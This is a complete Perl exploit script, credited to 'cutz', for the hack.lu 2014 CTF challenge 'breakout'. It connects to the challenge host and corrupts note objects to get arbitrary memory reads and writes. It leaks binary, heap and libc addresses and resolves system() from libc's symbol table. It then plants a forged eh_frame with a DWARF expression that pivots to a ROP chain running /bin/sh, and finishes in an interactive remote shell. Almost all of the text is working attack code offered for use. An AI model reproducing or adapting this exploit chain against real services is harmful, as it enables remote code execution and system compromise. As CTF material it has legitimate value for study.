# hacklu2014 breakout exploit
# by cutz
# thx to r1cky for this fine challenge :)

# exploit requires katana to be installed in $PATH

use strict;
use IO::Socket;
use MIME::Base64;
$|++;

my $dwarf_script = decode_base64 '
c2VjdGlvbl90eXBlOiAiLmVoX2ZyYW1lIgpzZWN0aW9uX2FkZHI6IHtzZWN0aW9uX2FkZHJ9CmVo
X2hkcl9hZGRyOiB7ZWhfaGRyX2FkZHJ9CmV4Y2VwdF90YWJsZV9hZGRyOiB7ZXhjZXB0X3RhYmxl
X2FkZHJ9CmVoX2hkcl90YWJsZV9lbmM6IERXX0VIX1BFX3NkYXRhNCwgRFdfRUhfUEVfZGF0YXJl
bApiZWdpbiBDSUUKaW5kZXg6IDAKdmVyc2lvbjogMQpkYXRhX2FsaWduOiAtOApjb2RlX2FsaWdu
OiAxCnJldHVybl9hZGRyX3J1bGU6IDE2CmZkZV9wdHJfZW5jOiBEV19FSF9QRV9zZGF0YTQsIERX
X0VIX1BFX3BjcmVsCmJlZ2luIElOU1RSVUNUSU9OUwpEV19DRkFfZGVmX2NmYSByNyA4CkRXX0NG
QV9vZmZzZXQgcjE2IDEKRFdfQ0ZBX3VuZGVmaW5lZCByMAplbmQgSU5TVFJVQ1RJT05TCmVuZCBD
SUUKYmVnaW4gQ0lFCmluZGV4OiAxCnZlcnNpb246IDEKZGF0YV9hbGlnbjogLTgKY29kZV9hbGln
bjogMQpyZXR1cm5fYWRkcl9ydWxlOiAxNgpmZGVfcHRyX2VuYzogRFdfRUhfUEVfc2RhdGE0LCBE
V19FSF9QRV9wY3JlbApiZWdpbiBJTlNUUlVDVElPTlMKRFdfQ0ZBX2RlZl9jZmEgcjcgOApEV19D
RkFfb2Zmc2V0IHIxNiAxCmVuZCBJTlNUUlVDVElPTlMKZW5kIENJRQpiZWdpbiBDSUUKaW5kZXg6
IDIKdmVyc2lvbjogMQpkYXRhX2FsaWduOiAtOApjb2RlX2FsaWduOiAxCnJldHVybl9hZGRyX3J1
bGU6IDE2CmZkZV9wdHJfZW5jOiBEV19FSF9QRV9zZGF0YTQsIERXX0VIX1BFX3BjcmVsCmZkZV9s
c2RhX3B0cl9lbmM6IERXX0VIX1BFX3NkYXRhNCwgRFdfRUhfUEVfcGNyZWwKcGVyc29uYWxpdHlf
cHRyX2VuYzogRFdfRUhfUEVfc2RhdGE0LCBEV19FSF9QRV9pbmRpcmVjdCwgRFdfRUhfUEVfcGNy
ZWwKcGVyc29uYWxpdHk6IDB4MjAzMDE3CmJlZ2luIElOU1RSVUNUSU9OUwpEV19DRkFfZGVmX2Nm
YSByNyA4CkRXX0NGQV9vZmZzZXQgcjE2IDEKZW5kIElOU1RSVUNUSU9OUwplbmQgQ0lFCmJlZ2lu
IEZERQppbmRleDogMApjaWVfaW5kZXg6IDIKaW5pdGlhbF9sb2NhdGlvbjogMHhmNTAKYWRkcmVz
c19yYW5nZTogMHg5ZQpsc2RhX2lkeDogMHgwCmJlZ2luIElOU1RSVUNUSU9OUwpEV19DRkFfYWR2
YW5jZV9sb2MgMQpEV19DRkFfZGVmX2NmYV9vZmZzZXQgMTYKRFdfQ0ZBX29mZnNldCByMyAyCkRX
X0NGQV9hZHZhbmNlX2xvYyA0CkRXX0NGQV9kZWZfY2ZhX29mZnNldCAzMgpEV19DRkFfYWR2YW5j
ZV9sb2MxIDEzMApEV19DRkFfcmVtZW1iZXJfc3RhdGUKRFdfQ0ZBX2RlZl9jZmFfb2Zmc2V0IDE2
CkRXX0NGQV9hZHZhbmNlX2xvYyAxCkRXX0NGQV9kZWZfY2ZhX29mZnNldCA4CkRXX0NGQV9hZHZh
bmNlX2xvYyAxCkRXX0NGQV9yZXN0b3JlX3N0YXRlCmVuZCBJTlNUUlVDVElPTlMKZW5kIEZERQpi
ZWdpbiBGREUKaW5kZXg6IDEKY2llX2luZGV4OiAxCmluaXRpYWxfbG9jYXRpb246IDB4MWEzMAph
ZGRyZXNzX3JhbmdlOiAweDE0YwpiZWdpbiBJTlNUUlVDVElPTlMKRFdfQ0ZBX2FkdmFuY2VfbG9j
IDEKRFdfQ0ZBX2RlZl9jZmFfb2Zmc2V0IDE2CkRXX0NGQV9vZmZzZXQgcjMgMgpEV19DRkFfYWR2
YW5jZV9sb2MgMjEKRFdfQ0ZBX2RlZl9jZmFfb2Zmc2V0IDMyCkRXX0NGQV9hZHZhbmNlX2xvYzEg
MjI3CkRXX0NGQV9yZW1lbWJlcl9zdGF0ZQpEV19DRkFfZGVmX2NmYV9vZmZzZXQgMTYKRFdfQ0ZB
X2FkdmFuY2VfbG9jIDEKRFdfQ0ZBX2RlZl9jZmFfb2Zmc2V0IDgKRFdfQ0ZBX2FkdmFuY2VfbG9j
IDYKRFdfQ0ZBX3Jlc3RvcmVfc3RhdGUKRFdfQ0ZBX3ZhbF9leHByZXNzaW9uIHI3CmJlZ2luIEVY
UFJFU1NJT04KRFdfT1BfYnJlZzcgLTY4OAplbmQgRVhQUkVTU0lPTgpEV19DRkFfdmFsX2V4cHJl
c3Npb24gcjYKYmVnaW4gRVhQUkVTU0lPTgpEV19PUF9jb25zdHUge2hpZ2h9CkRXX09QX2NvbnN0
dSAweDIwCkRXX09QX3NobApEV19PUF9jb25zdHUge2xvd30KRFdfT1BfcGx1cwplbmQgRVhQUkVT
U0lPTgplbmQgSU5TVFJVQ1RJT05TCmVuZCBGREUKYmVnaW4gTFNEQQpscHN0YXJ0OiAweDAKdHlw
ZWluZm9fZW5jOiBEV19FSF9QRV9zZGF0YTQsIERXX0VIX1BFX2luZGlyZWN0LCBEV19FSF9QRV9w
Y3JlbApiZWdpbiBDQUxMX1NJVEUKcG9zaXRpb246IDB4MTUKbGVuZ3RoOiAweDUKbGFuZGluZ19w
YWQ6IDB4MApoYXNfYWN0aW9uOiBmYWxzZQplbmQgQ0FMTF9TSVRFCmJlZ2luIENBTExfU0lURQpw
b3NpdGlvbjogMHgyMApsZW5ndGg6IDB4NQpsYW5kaW5nX3BhZDogMHgyNTYKaGFzX2FjdGlvbjog
dHJ1ZQpmaXJzdF9hY3Rpb246IDAKZW5kIENBTExfU0lURQpiZWdpbiBDQUxMX1NJVEUKcG9zaXRp
b246IDB4MzAKbGVuZ3RoOiAweDUKbGFuZGluZ19wYWQ6IDB4MApoYXNfYWN0aW9uOiBmYWxzZQpl
bmQgQ0FMTF9TSVRFCmJlZ2luIENBTExfU0lURQpwb3NpdGlvbjogMHg1NApsZW5ndGg6IDB4NQps
YW5kaW5nX3BhZDogMHg4OQpoYXNfYWN0aW9uOiBmYWxzZQplbmQgQ0FMTF9TSVRFCmJlZ2luIENB
TExfU0lURQpwb3NpdGlvbjogMHg5NApsZW5ndGg6IDB4NQpsYW5kaW5nX3BhZDogMHgwCmhhc19h
Y3Rpb246IGZhbHNlCmVuZCBDQUxMX1NJVEUKYmVnaW4gQUNUSU9OCnR5cGVfaWR4OiAwCm5leHQ6
IG5vbmUKZW5kIEFDVElPTgp0eXBlaW5mbzogMHgyMDMwMTAKZW5kIExTREEK
';

my $sock = IO::Socket::INET->new(
        PeerAddr => 'wildwildweb.fluxfingers.net',
        PeerPort => 1404,
        Proto => 'tcp'
) or die 'wut', $/;

sub read_until
{
        my $until = shift;
        my $ret = '';

        while (1) {
                sysread $sock, my $tmp, 1024, 0;
                $ret .= $tmp;
                return $ret if $ret =~ /$until/;
        }
}

sub add_note
{
        my ($cell, $size, $note) = @_;

        print $sock 'note';
        read_until 'Cell: ';
        print $sock $cell;
        read_until 'Size: ';
        print $sock $size;
        read_until 'Note: ';
        print $sock $note;
}

sub punish
{
        my $cell = shift;

        print $sock 'punish';
        read_until 'Cell: ';
        print $sock $cell;
}

sub list
{
        print $sock 'list';
        return read_until '> ';
}

sub leak
{
        my ($from, $num) = @_;
        my $leak;

        add_note(9, 64, "\x00"x28 . pack('I', 9) . pack('Q', 0) .
                pack('Q', $num) . pack('Q', $from));

        read_until('> ');
        $_ = list(); s/\n\n> //g;
        $leak = substr $_, -$num;

        return $leak;
}

sub writex
{
        my ($target, $value) = @_;

        add_note(9, 64, "\x00"x28 . pack('I', 0) . pack('Q', 0) .
                pack('Q', -1) . pack('Q', $target));

        read_until('> ');
        add_note(0, length $value, $value);
}

sub get_elf
{
        my $start = shift;
        my $pages = 0;

        $start &= 0xfffffffffffff000;
        $pages += 0x1000 while leak($start - $pages, 4) !~ /^\x7fELF/;

        return $start - $pages;
}

sub get_prog_headers
{
        my $base = shift;
        return unpack 'Q', leak($base + 32, 8);
}

sub get_prog_header_entry
{
        my ($prog, $type) = @_;

        my $i = 0;
        while (1) {
                last if (unpack 'I', leak($prog + $i, 4)) == $type;
                $i += 56;
        }

        return unpack 'Q', leak($prog + $i + 24, 8);
}

sub get_str_symtab
{
        my $dynamic = shift;
        my ($strtab, $symtab, $type);

        my $i = 0;
        while (!defined $strtab or !defined $symtab) {
                $type = unpack 'Q', leak($dynamic + $i, 8);

                $strtab = unpack 'Q', leak($dynamic + $i + 8, 8)
                if $type == 5;
                $symtab = unpack 'Q', leak($dynamic + $i + 8, 8)
                if $type == 6;

                $i += 16;
        }

        return ($strtab, $symtab);
}

sub get_symbol
{
        my ($symbol, $strtab, $symtab) = @_;
        my $offset;
        my $i = 0;

        while (1) {
                $offset = unpack 'I', leak($symtab + $i, 4);

                return unpack 'Q', leak($symtab + $i + 8, 8)
                        if leak($strtab + $offset, length $symbol) eq $symbol;
		print '[x] got function: ';
		print leak($strtab + $offset, length $symbol);

                $i += 24;
		print "\r";
        }
}

sub shell
{
        sysread $sock, my $buf, 1024, 0;

        while (1) {
                print '$ ';
                my $cmd = <>;
                print $sock $cmd;
                sysread $sock, my $buf, 1024, 0;
                print $buf;
        }
}

print 'hacklu2014 breakout Exploit', $/;
print 'by cutz', $/, $/;

read_until('> ');
print $sock 'lol';
read_until('> ');

print '[x] creating a leaking note', $/;
add_note(0, 10, 'A'x10);
read_until('> ');

print '[x] freeing prisoner 0', $/;
punish(0);
read_until('> ');

print '[x] creating fake prisoner', $/;
add_note(9, 64, "\x00"x28 . pack('I', 9) . pack('Q', 0) . pack('Q', 136));
read_until('> ');

print '[x] executing first leak: ';
my $leak = list();
$leak =~ s/\n\n> //g;
$leak = unpack 'Q', substr $leak, -8;
printf "0x%x\n", $leak;
my $base = $leak - 0x1c28;

printf '[x] base should be at 0x%x, verifying: ', $base;
die 'failed', $/ if leak($base, 4) !~ /^\x7fELF/;
print 'success', $/;

print '[x] leaking dst_whtelist: ';
my $whitelist = unpack 'Q', leak($base + 0x203030, 8);
printf "0x%x\n", $whitelist;

print '[x] heap base: ';
my $heap_base = unpack 'Q', leak($whitelist, 8);
printf "0x%x\n", $heap_base;

print '[x] and libgcc cache offset ';
my $libgcccache = unpack 'Q', leak($whitelist + 16, 8);
printf "0x%x\n", $libgcccache;

my $frame_hdr_cache = $libgcccache + 48 * 2;
my $target_ptr = $frame_hdr_cache + 24;
printf "[x] pointer to overwrite: 0x%x\n", $target_ptr;

print '[x] getting free() in libc: ';
my $free_libc = unpack 'Q', leak($base + 0x202f30, 8);
printf "0x%x\n", $free_libc;

print '[x] scanning for libc base: ';
my $libc_base = get_elf($free_libc);
printf "0x%x\n", $libc_base;

print '[x] libc prog headers at: ';
my $libc_prog_hdrs = get_prog_headers($libc_base) + $libc_base;
printf "0x%x\n", $libc_prog_hdrs;

print '[x] libc dynamic at: ';
my $libc_dynamic = get_prog_header_entry($libc_prog_hdrs, 2) + $libc_base;
printf "0x%x\n", $libc_dynamic;

my ($libc_strtab, $libc_symtab) = get_str_symtab($libc_dynamic);
printf "[x] libc strtab at 0x%x\n", $libc_strtab;
printf "[x] libc symtab at 0x%x\n", $libc_symtab;

print '[x] dumping symbols to find system (might take a while)', $/;
my $system = get_symbol('system', $libc_strtab, $libc_symtab) + $libc_base;
printf "[x] system at 0x%x\n", $system;

print '[x] overwriting target to heap base + 0x1000', $/;
my $fake_base = $heap_base + 0x1000;
writex($target_ptr, pack 'Q', $fake_base);

print '[x] preparing rop stack at heap base + 0x2000', $/;
my $ropstack =
        pack('Q', -1) .
        pack('Q', -1) .
        pack('Q', -1) .
        pack('Q', $base + 0x11ac) .     # pop rdi
        pack('Q', $heap_base + 0x2100). # /bin/sh
        pack('Q', $system);

writex($heap_base + 0x2000, $ropstack);
writex($heap_base + 0x2100, '/bin/sh 2>&1');

my $rop_addr_high = ($heap_base + 0x2000) >> 32;
my $rop_addr_low  = ($heap_base + 0x2000) & 0x00000000ffffffff;
$rop_addr_high += 1 unless $rop_addr_low < 0x80000000;

print '[x] preparing fake eh_frame header inside heap base + 0x1000', $/;
my $fake_eh_offset = $fake_base - $base + 56;
my $fake_eh_header =
        pack('I', 0x6474e550) .
        pack('I', 0x00000004) .
        pack('Q', $fake_eh_offset) .
        pack('Q', $fake_eh_offset) .
        pack('Q', $fake_eh_offset) .
        pack('Q', 0x0000000000000084) .
        pack('Q', 0x0000000000000084) .
        pack('Q', 0x0000000000000004);

writex($heap_base + 0x1000, $fake_eh_header);

print '[x] preparing dwarf script', $/;
my $eh_hdr_addr    = $fake_eh_offset;
my $section_addr   = $eh_hdr_addr  + 0x60;
my $gcc_extab_addr = $section_addr + 0x200;

my $hexeh_hdr_addr    = sprintf "0x%x", $eh_hdr_addr;
my $hexsection_addr   = sprintf "0x%x", $section_addr;
my $hexgcc_extab_addr = sprintf "0x%x", $gcc_extab_addr;
my $hexrop_addr_high  = sprintf "0x%x", $rop_addr_high;
my $hexrop_addr_low   = sprintf "0x%x", $rop_addr_low;

$dwarf_script =~ s/{section_addr}/$hexsection_addr/;
$dwarf_script =~ s/{eh_hdr_addr}/$hexeh_hdr_addr/;
$dwarf_script =~ s/{except_table_addr}/$hexgcc_extab_addr/;
$dwarf_script =~ s/{high}/$hexrop_addr_high/;
$dwarf_script =~ s/{low}/$hexrop_addr_low/;

open F, '>', 'dwarf.dws' or die 'wut', $/;
print F $dwarf_script;
close F;

print '[x] compiling dwarf script', $/;
my $katana_cmd =
        '$ehframe = dwarfscript compile "dwarf.dws"' . $/ .
        'save $ehframe[0] "eh_frame.dat"' . $/ .
        'save $ehframe[1] "eh_frame_hdr.dat"' . $/ .
        'save $ehframe[2] "gcc_ex_table.dat"';

open F, '| katana > /dev/null' or die 'wut', $/;
print F $katana_cmd;
close F;

open F, '<', 'eh_frame.dat' or die 'wut', $/;
my $eh_frame_dat = do { local $/; <F> };
close F;

open F, '<', 'eh_frame_hdr.dat' or die 'wut', $/;
my $eh_frame_hdr_dat = do { local $/; <F> };
close F;

open F, '<', 'gcc_ex_table.dat' or die 'wut', $/;
my $gcc_ex_table_dat = do { local $/; <F> };
close F;

print '[x] sending the eh_header', $/;
writex($base + $eh_hdr_addr, $eh_frame_hdr_dat);

print '[x] sending the eh_frame', $/;
writex($base + $section_addr, $eh_frame_dat);

print '[x] sending the gcc_except_table', $/;
writex($base + $gcc_extab_addr, $gcc_ex_table_dat);

print '[x] triggering the exception', $/;
print $sock 'y0suck';
shell();

